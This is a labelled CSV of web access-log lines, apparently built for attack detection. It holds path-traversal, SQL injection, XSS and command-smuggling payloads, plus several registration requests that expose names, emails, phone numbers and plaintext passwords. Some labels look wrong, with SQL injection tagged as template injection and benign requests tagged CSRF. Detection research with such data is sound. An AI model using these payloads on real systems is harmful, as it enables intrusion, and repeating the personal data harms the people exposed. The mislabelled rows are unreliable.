source,text
"10.128.0.205 - - [24/Mar/2018:21:42:08 +0330] ""GET /lcgi/sewse.nlm?sys:/novonyx/suitespot/docs/sewse/viewcode.jse+httplist+httplist/../../../../../system/autoexec.ncf HTTP/1.1"" 404 1056 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.128.0.238 - - [24/Mar/2018:21:51:16 +0330] ""GET /../../../../../../../../../../../windows/win.ini HTTP/1.1"" 400 161 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"5.101.40.234 - - [23/Jan/2019:06:59:05 +0330] ""GET /image/{{basketItem.id}}?type=productModel&wh=50x50%27%29%20ORDER%20BY%201%23 HTTP/1.1"" 200 5 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"10.128.0.205 - - [24/Mar/2018:21:40:07 +0330] ""GET /setup/setup-/../../log.jsp?log=info&mode=asc&lines=10 HTTP/1.1"" 302 0 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"192.168.202.110 - - [16/Mar/2012:19:37:31 +0330] ""GET /forum.php?id_article=1&id_forum=-1/**/UNION/**/SELECT 537524279-- HTTP/1.1"" 404 287 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"10.128.0.205 - - [24/Mar/2018:21:40:21 +0330] ""GET /ldap/cgi-bin/ldacgi.exe?Action=Substitute&Template=../../../../../boot.ini&Sub=LocalePath&LocalePath=enus1252 HTTP/1.1"" 404 298 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"192.168.202.110 - - [16/Mar/2012:18:29:05 +0330] ""GET /cgi-bin/insertorder.cfm?CFID=1&CFTOKEN=1 UNION SELECT 1,2,3,4,storename,6,7,8,9,10,11,12,13,14,15 from Params""having 1=1 HTTP/1.1"" 404 301 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"5.101.40.234 - - [23/Jan/2019:06:57:10 +0330] ""GET /image/{{basketItem.id}}?type=productModel&wh=50x50%20AND%205505%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%285505%3D5505%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28122%29%2BCHAR%28113%29%29%29--%20NVvd HTTP/1.1"" 200 5 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"10.128.0.238 - - [24/Mar/2018:21:51:16 +0330] ""GET /ifx/?LO=../../../../../etc/passwd HTTP/1.1"" 404 297 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.128.0.238 - - [24/Mar/2018:21:55:42 +0330] ""POST http://127.0.0.1/iControl/iControlPortal.cgi HTTP/1.1"" 404 203 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Server-Side Request Forgery
"192.168.202.110 - - [16/Mar/2012:14:23:24 +0330] ""GET /examples/jsp/cal/forum.php3?id_article=1&id_forum=-1/**/UNION/**/SELECT 731802903-- HTTP/1.1"" 404 305 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"10.128.0.205 - - [24/Mar/2018:21:51:18 +0330] ""GET /lcgi/sewse.nlm?sys:/novonyx/suitespot/docs/sewse/viewcode.jse+httplist+httplist/../../../../../system/autoexec.ncf HTTP/1.1"" 404 7657 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"5.201.229.153 - - [26/Jan/2019:19:19:16 +0330] ""GET /customer/saveBasicInfo?id=&version=&csrf_token=7e3ad709a3cfdc4dd17dedb3ea0d4c2b67f69f11ada0efbb182426b91f6b798a&firstName=%D8%B3%DB%8C%D8%AF+%D9%85%D8%B5%D8%B7%D9%81%DB%8C+&lastName=%D9%85%D9%88%D8%B3%D9%88%DB%8C+&username=moossavi34%40gmail.com&mobile=09203033647&password=mooss647&password2=mooss647&newsLettersSwitch=on HTTP/1.1"" 302 0 ""https://www.zanbil.ir/customer/register"" ""Mozilla/5.0 (Linux; Android 8.0.0; RNE-L21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36"" ""-""",Cross-Site Request Forgery
"10.128.0.205 - - [24/Mar/2018:21:45:06 +0330] ""GET http://10.47.44.30/authentication/login/ HTTP/1.1"" 404 571 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Server-Side Request Forgery
"192.168.202.110 - - [16/Mar/2012:16:45:51 +0330] ""GET /cacti/index.php?page=documents&doc=-99' UNION SELECT null,null,'nessus','dcpportal_sql.nasl',null,null,null,null,null,null,null,null-- HTTP/1.1"" 200 1189 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"10.128.0.238 - - [24/Mar/2018:21:52:59 +0330] ""GET /logon?onok=""><script>alert('axon_logon_xss.nasl')</script> HTTP/1.1"" 404 280 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Cross-Site Scripting
"10.128.0.205 - - [24/Mar/2018:21:40:57 +0330] ""GET http://rfi.nessus.org/check_proxy.html HTTP/1.0"" 404 151 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Server-Side Request Forgery
"192.168.202.138 - - [17/Mar/2012:19:17:19 +0330] ""GET /cgi-bin/index.php?page=documents&doc=-99' UNION SELECT null,null,'nessus','dcpportal_sql.nasl',null,null,null,null,null,null,null,null-- HTTP/1.1"" 404 295 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"192.168.202.110 - - [16/Mar/2012:14:22:37 +0330] ""GET /scripts/calendar.php?month=' UNION SELECT 1,1,'1331904224','calendarix_month_sql_injection.nasl',1 # HTTP/1.1"" 404 298 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"192.168.202.110 - - [16/Mar/2012:14:26:13 +0330] ""GET /examples/servlets/servlet/parse_xml.cgi?action=login&filename=frameset.html|id\x00| HTTP/1.1"" 404 317 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",file upload
"192.168.202.110 - - [16/Mar/2012:14:26:30 +0330] ""GET /index.php?x=browse&category='UNION SELECT '1','2','pixelpost_category_sql_injection.nasl','1331904457','5'-- HTTP/1.1"" 404 287 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"46.167.156.4 - - [26/Jan/2019:10:35:50 +0330] ""GET /customer/saveBasicInfo?id=&version=&csrf_token=7e3ad709a3cfdc4dd17dedb3ea0d4c2b67f69f11ada0efbb182426b91f6b798a&firstName=%D8%B9%D9%84%DB%8C+%D8%B1%D8%B6%D8%A7&lastName=%D9%85%D8%B9%D8%B1%D9%88%D9%81&username=marouf.alireza%40yahoo.com&mobile=09111718397&password=Ali8397&password2=Ali8397 HTTP/1.1"" 302 0 ""https://www.zanbil.ir/customer/register"" ""Mozilla/5.0 (iPhone; CPU iPhone OS 12_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1"" ""-""",Cross-Site Request Forgery
"10.128.0.205 - - [24/Mar/2018:21:45:01 +0330] ""GET http://rfi.nessus.org/check_proxy.html HTTP/1.1"" 404 214 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Server-Side Request Forgery
"192.168.202.110 - - [16/Mar/2012:18:32:35 +0330] ""GET /cgi-bin/SPT--ForumTopics.php?forumid=-9 UNION SELECT null,null,null,1331919224,4,5 HTTP/1.1"" 404 1635 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"5.101.40.234 - - [23/Jan/2019:06:54:07 +0330] ""GET /image/{{basketItem.id}}?type=productModel%20AND%209333%3D%28SELECT%209333%20FROM%20PG_SLEEP%285%29%29&wh=50x50 HTTP/1.1"" 301 178 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"10.128.0.205 - - [24/Mar/2018:21:40:18 +0330] ""GET /scripts/fake.cgi?arg=/../../../../../winnt/win.ini HTTP/1.1"" 404 292 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"192.168.202.110 - - [16/Mar/2012:16:45:51 +0330] ""GET /scripts/index.php?page=documents&doc=-99' UNION SELECT null,null,'nessus','dcpportal_sql.nasl',null,null,null,null,null,null,null,null-- HTTP/1.1"" 404 294 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"192.168.202.138 - - [17/Mar/2012:19:22:09 +0330] ""GET /cgi-bin/index.php?action=view&module=resourcesmodule&id=0 UNION SELECT -1,'exponent_0964.nasl','Nessus test','O:8:""stdClass"":3:{s:3:""mod"";s:15:""resourcesmodule"";s:3:""src"";s:20:""@random41940ceb78dbb"";s:3:""int"";s:0:"""";}',7,0,0,0,0,0,0 -- HTTP/1.1"" 404 295 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"10.128.0.205 - - [24/Mar/2018:21:40:06 +0330] ""GET /ods-cgi/odscgi?HTMLFile=../../../../../../../../../../../../../../../boot.ini HTTP/1.1"" 404 1245 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"192.168.202.110 - - [16/Mar/2012:14:25:14 +0330] ""GET /examples/jsp/colors/demos/demo.browse.php?filename=/etc/passwd HTTP/1.1"" 404 319 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",file upload
"10.128.0.205 - - [24/Mar/2018:21:41:41 +0330] ""GET /ods-cgi/odscgi?HTMLFile=../../../../../../../../../../../../../../../boot.ini HTTP/1.1"" 404 1056 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.128.0.205 - - [24/Mar/2018:21:54:02 +0330] ""GET /lcgi/sewse.nlm?sys:/novonyx/suitespot/docs/sewse/viewcode.jse+httplist+httplist/../../../../../system/autoexec.ncf HTTP/1.1"" 404 1245 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"5.101.40.234 - - [23/Jan/2019:06:57:38 +0330] ""GET /image/{{basketItem.id}}?type=productModel&wh=50x50%27%29%20AND%20SLEEP%285%29%20AND%20%28%27xMrK%27%3D%27xMrK HTTP/1.1"" 301 178 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"10.128.0.205 - - [24/Mar/2018:21:41:14 +0330] ""GET /scripts/fake.cgi?arg=/dir/../../../../../../etc/passwd HTTP/1.1"" 404 233 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"192.168.202.110 - - [16/Mar/2012:16:44:31 +0330] ""GET /guestbook.php?lang=de&mode=new&quote=-1 UNION SELECT 0,0,username,0,password,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 FROM simpgb_users WHERE 1 HTTP/1.1"" 404 290 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"192.168.202.110 - - [16/Mar/2012:15:37:45 +0330] ""GET /scripts/bemarket/shop/index.php?pageurl=viewpage&filename=../../../../../../../../../../../../../../etc/passwd HTTP/1.0"" 200 90 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",file upload
"10.128.0.205 - - [24/Mar/2018:21:41:38 +0330] ""GET /console/faces/com_sun_web_ui/help/masthead.jsp?windowTitle=</title><script>alert('sun_java_web_console_helpwindow_xss.nasl')</script> HTTP/1.1"" 404 7692 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Cross-Site Scripting
"10.128.0.205 - - [24/Mar/2018:21:49:19 +0330] ""GET /\x80../\x80../\x80../\x80../\x80../\x80../winnt/win.ini HTTP/1.1"" 404 1245 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"5.101.40.234 - - [23/Jan/2019:06:53:05 +0330] ""GET /image/{{basketItem.id}}?type=productModel%20AND%209438%3D5231&wh=50x50 HTTP/1.1"" 301 178 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"10.128.0.205 - - [24/Mar/2018:22:45:34 +0330] ""GET .\\.\\.\\.\\.\\.\\.\\.\\.\\.\\/winnt/win.ini HTTP/1.1"" 404 7556 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Server-Side Request Forgery
"10.128.0.205 - - [24/Mar/2018:21:44:46 +0330] ""GET ../../../../../../../../../../../../winnt/win.ini HTTP/1.1"" 400 226 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Server-Side Request Forgery
"192.168.202.110 - - [16/Mar/2012:14:26:25 +0330] ""GET /examples/jsp/cal/index.php?act=sm_window&page=event&day=-1 UNION SELECT 1,1331904452,1019076408 -- HTTP/1.1"" 404 1033 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"10.164.94.120 - - [24/Mar/2018:18:16:04 +0330] ""GET / HTTP/1.1"" 301 56 ""-"" ""<script>foo</script>"" ""-""",Cross-Site Scripting
"5.101.40.234 - - [23/Jan/2019:06:57:44 +0330] ""GET /image/{{basketItem.id}}?type=productModel&wh=50x50%20WAITFOR%20DELAY%20%270%3A0%3A5%27 HTTP/1.1"" 200 5 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"192.168.202.110 - - [16/Mar/2012:16:47:06 +0330] ""GET /scripts/index.php?option=weblinks&Itemid=2&catid=-1 UNION SELECT 0,1,2,242030074539,4,5,6,7,8,9,10,11-- HTTP/1.1"" 404 294 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"5.78.79.71 - - [22/Jan/2019:15:07:22 +0330] ""GET /browse/stove-and-oven/%D8%A7%D8%AC%D8%A7%D9%82-%DA%AF%D8%A7%D8%B2-%D9%85%D8%A8%D9%84%D9%87 HTTP/1.1"" 200 34976 ""https://www.google.com/url?url=https://www.zanbil.ir/browse/stove-and-oven/%25D8%25A7%25D8%25AC%25D8%25A7%25D9%2582-%25DA%25AF%25D8%25A7%25D8%25B2-%25D9%2585%25D8%25A8%25D9%2584%25D9%2587&rct=j&frm=1&q=&esrc=s&sa=U&ved=0ahUKEwjW7er5pYHgAhWwxYUKHSC3DjYQFggdMAM&usg=AOvVaw3-RWZ33rrwHnc0cCtBvXzH"" ""Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"" ""-""",Cross-Site Request Forgery
"5.101.40.234 - - [23/Jan/2019:06:57:09 +0330] ""GET /image/{{basketItem.id}}?type=productModel&wh=50x50%20AND%205505%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%285505%3D5505%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28122%29%2BCHAR%28113%29%29%29--%20NVvd HTTP/1.1"" 301 178 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"192.168.202.110 - - [16/Mar/2012:18:32:27 +0330] ""GET /evb/check_url.php?url=pligg_url_sql_injection.nasl' UNION SELECT 1331919216,1114321675 --  HTTP/1.1"" 404 1635 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"5.112.140.164 - - [23/Jan/2019:22:57:01 +0330] ""GET /customer/saveBasicInfo?id=&version=&csrf_token=7e3ad709a3cfdc4dd17dedb3ea0d4c2b67f69f11ada0efbb182426b91f6b798a&firstName=%D9%88%D8%AD%DB%8C%D8%AF%D9%87+&lastName=%D8%A7%D8%B1%D9%85+%D9%85%D9%87%D8%B1&username=erammehr1359%40yahoo.com&mobile=09354132776&password=13598250&password2=1359820&sexSwitch=on HTTP/1.1"" 200 18083 ""https://www.zanbil.ir/customer/register"" ""Mozilla/5.0 (Linux; Android 8.0.0; SAMSUNG SM-C7000 Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/8.2 Chrome/63.0.3239.111 Mobile Safari/537.36"" ""-""",Cross-Site Request Forgery
"5.113.162.148 - - [23/Jan/2019:09:04:27 +0330] ""GET /customer/saveBasicInfo?id=&version=&csrf_token=7e3ad709a3cfdc4dd17dedb3ea0d4c2b67f69f11ada0efbb182426b91f6b798a&firstName=%D9%85%D8%AD%D8%A8%D9%88%D8%A8&lastName=%D8%B3%D9%84%DB%8C%D9%85%D8%A7%D9%86%DB%8C&username=mahbubsolimani314%40gmail.com&mobile=09059120680&password=6667&password2=6667 HTTP/1.1"" 302 0 ""https://www.zanbil.ir/customer/register"" ""Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-A300H Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.3 Chrome/38.0.2125.102 Mobile Safari/537.36"" ""-""",Cross-Site Request Forgery
"10.128.0.238 - - [24/Mar/2018:21:55:17 +0330] ""GET //../../../../../../../../../../../../etc/passwd HTTP/1.1"" 403 312 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.128.0.205 - - [24/Mar/2018:21:44:41 +0330] ""GET /scripts/fake.cgi?arg=/../../../../../winnt/win.ini HTTP/1.1"" 302 0 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"5.101.40.234 - - [23/Jan/2019:06:53:15 +0330] ""GET /image/{{basketItem.id}}?type=productModel%20AND%201453%3D6122--%20cdxG&wh=50x50 HTTP/1.1"" 301 178 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"10.128.0.205 - - [24/Mar/2018:21:44:58 +0330] ""GET .\\.\\.\\.\\.\\.\\.\\.\\.\\.\\/windows/win.ini HTTP/1.1"" 400 324 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Server-Side Request Forgery
"10.128.0.238 - - [24/Mar/2018:21:51:11 +0330] ""GET /examples/jsp/source.jsp?../../../../system/autoexec.ncf HTTP/1.1"" 404 7614 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"192.168.202.102 - - [16/Mar/2012:18:02:20 +0330] ""GET /gepi/gestion/savebackup.php?cmd=cat/etc/passwd&filename=@RFIURL HTTP/1.1"" 404 305 ""-"" ""Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)"" ""-""",file upload
"10.128.0.205 - - [24/Mar/2018:21:41:33 +0330] ""POST http://127.0.0.1/iControl/iControlPortal.cgi HTTP/1.1"" 404 1245 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Server-Side Request Forgery
"10.128.0.205 - - [24/Mar/2018:21:44:48 +0330] ""GET /../../../../../../../../../../../../etc/passwd HTTP/1.1"" 404 244 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"5.101.40.234 - - [23/Jan/2019:06:54:33 +0330] ""GET /image/{{basketItem.id}}?type=productModel%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL--%20ESVO&wh=50x50 HTTP/1.1"" 301 178 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"5.101.40.234 - - [23/Jan/2019:06:57:45 +0330] ""GET /image/{{basketItem.id}}?type=productModel&wh=50x50%27%20WAITFOR%20DELAY%20%270%3A0%3A5%27%20AND%20%27yphE%27%3D%27yphE HTTP/1.1"" 301 178 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"5.101.40.234 - - [23/Jan/2019:06:58:35 +0330] ""GET /image/{{basketItem.id}}?type=productModel&wh=50x50%25%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20WRAG HTTP/1.1"" 200 5 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"10.128.0.205 - - [24/Mar/2018:22:45:34 +0330] ""GET /scripts/fake.cgi?arg=/dir/../../../../../../etc/passwd HTTP/1.1"" 404 7597 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"192.168.202.110 - - [16/Mar/2012:19:38:50 +0330] ""GET /photo.php?albumid=-284' UNION SELECT 1,concat(0x73,0x69,0x74,0x65,0x78,0x5f,0x61,0x6c,0x62,0x75,0x6d,0x69,0x64,0x5f,0x73,0x71,0x6c,0x69,0x2e,0x6e,0x61,0x73,0x6c),3,4,5,6,7,8 -- ' HTTP/1.1"" 404 287 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"10.128.0.205 - - [24/Mar/2018:21:41:45 +0330] ""GET /cgi-bin/..\xc0\xaf..\xc0\xaf..\xc0\xaf..\xc0\xaf..\xc0\xaf../winnt/system32/cmd.exe?/c+dir+c:\\+/OG HTTP/1.1"" 404 1245 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"2.191.96.86 - - [22/Jan/2019:14:57:24 +0330] ""GET /customer/saveBasicInfo?id=&version=&csrf_token=7e3ad709a3cfdc4dd17dedb3ea0d4c2b67f69f11ada0efbb182426b91f6b798a&firstName=%D9%85%D9%87%D8%AF%DB%8C&lastName=%D8%A8%DB%8C%DA%A9&username=360%40mahdi.com&mobile=09359776116&password=13951395&password2=13951395&sexSwitch=on HTTP/1.1"" 302 0 ""https://www.zanbil.ir/customer/saveBasicInfo?id=&version=&csrf_token=7e3ad709a3cfdc4dd17dedb3ea0d4c2b67f69f11ada0efbb182426b91f6b798a&firstName=%D9%85%D9%87%D8%AF%DB%8C&lastName=%D8%A8%DB%8C%DA%A9&username=360%40mahdi&mobile=09359776116&password=13951395&password2=13951395&newsLettersSwitch=on"" ""Mozilla/5.0 (Linux; Android 4.3; fa-ir; SAMSUNG SM-G7102 Build/JLS36C) AppleWebKit/537.36 (KHTML, like Gecko) Version/1.5 Chrome/28.0.1500.94 Mobile Safari/537.36"" ""-""",Cross-Site Request Forgery
"10.128.0.205 - - [24/Mar/2018:23:00:11 +0330] ""GET /note.txt?F_notini=&T_note=&nomentreprise=blah&filenote=../../winnt/win.ini HTTP/1.1"" 404 1245 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.164.94.120 - - [24/Mar/2018:18:16:02 +0330] ""GET /./../../../../../../../../../../../etc/passwd HTTP/1.1"" 301 56 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.128.0.238 - - [24/Mar/2018:21:51:15 +0330] ""GET /console/faces/com_sun_web_ui/help/masthead.jsp?windowTitle=</title><script>alert('sun_java_web_console_helpwindow_xss.nasl')</script> HTTP/1.1"" 404 345 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Cross-Site Scripting
"10.128.0.238 - - [24/Mar/2018:21:51:22 +0330] ""GET /././././././../../../../../windows/win.ini HTTP/1.1"" 400 161 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.128.0.205 - - [24/Mar/2018:21:44:48 +0330] ""GET /../../../../../../../../../../../../etc/passwd HTTP/1.1"" 400 226 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"5.101.40.234 - - [23/Jan/2019:06:56:13 +0330] ""GET /image/{{basketItem.id}}?type=productModel%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23&wh=50x50 HTTP/1.1"" 301 178 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"10.128.0.205 - - [24/Mar/2018:21:49:19 +0330] ""GET /scripts/fake.cgi?arg=/dir/../../../../../../../../../../../winnt/win.ini HTTP/1.1"" 404 1245 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
